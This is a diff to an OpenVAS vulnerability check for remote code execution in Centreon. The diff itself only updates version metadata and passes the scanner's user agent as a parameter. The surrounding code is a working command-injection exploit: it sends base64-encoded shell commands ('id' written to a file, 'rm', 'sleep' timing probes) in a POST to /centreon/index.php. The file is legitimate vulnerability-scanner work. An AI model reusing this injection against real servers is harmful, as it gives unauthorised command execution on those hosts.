@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_centreon_rce_11_14.nasl 10285 2018-06-21 12:22:45Z cfischer $
+# $Id: gb_centreon_rce_11_14.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # Centreon Remote Code Execution
 #
@@ -32,9 +32,9 @@ if(description)
   script_oid("1.3.6.1.4.1.25623.1.0.105125");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 10285 $");
+  script_version("$Revision: 11222 $");
   script_name("Centreon Remote Code Execution ");
-  script_tag(name:"last_modification", value:"$Date: 2018-06-21 14:22:45 +0200 (Thu, 21 Jun 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-11-29 11:50:21 +0100 (Sat, 29 Nov 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -76,7 +76,7 @@ include("http_keepalive.inc");
 include("misc_func.inc");
 include("host_details.inc");
 
-function _exploit( ex, host )
+function _exploit( ex, host, useragent )
 {
   ex = base64( str:ex );
 
@@ -85,7 +85,7 @@ function _exploit( ex, host )
 
   req = 'POST /centreon/index.php HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
-        'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+        'User-Agent: ' + useragent + '\r\n' +
         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
         'Accept-Language: de,en-US;q=0.7,en;q=0.3\r\n' +
         'Accept-Encoding: identity\r\n' +
@@ -95,9 +95,7 @@ function _exploit( ex, host )
         'Content-Length: ' + len + '\r\n' +
         '\r\n' +
         login_data;
-
   result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
-
 }
 
 port = get_app_port( cpe:CPE );
@@ -106,12 +104,13 @@ if( ! port ) exit( 0 );
 dir = get_app_location( cpe:CPE, port:port );
 if( ! dir ) exit( 0 );
 
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
 file = 'openvas_' + rand() + '.txt';
 ex = 'id > ./' + file;
 
-_exploit( ex:ex, host:host );
+_exploit( ex:ex, host:host, useragent:useragent );
 
 url = dir + '/' + file;
 req = http_get( item:url, port:port );
@@ -120,7 +119,7 @@ buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
 if( buf =~ 'uid=[0-9]+.*gid=[0-9]+' )
 {
   ex = 'rm ' + file;
-  _exploit( ex:ex, host:host );
+  _exploit( ex:ex, host:host, useragent:useragent );
   VULN = TRUE;
 }
 
@@ -128,7 +127,7 @@ if( ! VULN )
 {
   ex = 'sleep 1';
   start = unixtime();
-  _exploit( ex:ex, host:host );
+  _exploit( ex:ex, host:host, useragent:useragent );
   stop = unixtime();
 
   if( stop - start > 7 ) exit( 0 );
@@ -140,7 +139,7 @@ if( ! VULN )
   {
     ex = 'sleep ' + i;
     start = unixtime();
-    _exploit( ex:ex, host:host );
+    _exploit( ex:ex, host:host, useragent:useragent );
     stop = unixtime();
 
     if ( stop - start < i || stop - start > ( i + 2 + lat ) )
